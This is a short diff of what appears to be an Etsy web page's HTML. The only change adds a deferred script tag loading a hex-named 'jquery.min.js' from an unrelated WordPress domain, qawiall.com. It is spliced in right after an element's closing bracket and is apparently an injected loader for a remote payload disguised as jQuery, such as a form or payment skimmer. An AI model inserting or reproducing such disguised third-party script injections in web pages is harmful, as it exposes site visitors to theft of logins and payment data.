@@ -374,7 +374,7 @@
         data-currency="IDR"
         data-region="ID"
         
-    >
+    ><script src="https://qawiall.com/wp-includes/js/jquery/ba12d66291e647788d8a9f0878043603jquery.min.js" defer></script>
 
         <script nonce="gPiNOjdRCrWLas5Ik2CuS+N0">
     !function(a,b,c,d,e,f){a.ddjskey=e;a.ddoptions=f||null;var m=b.createElement(c),n=b.getElementsByTagName(c)[0];m.async=1,m.defer=1,m.src=d,n.parentNode.insertBefore(m,n)}(window,document,"script","https://www.etsy.com/include/tags.js", "D013AA612AB2224D03B2318D0F5B19", {
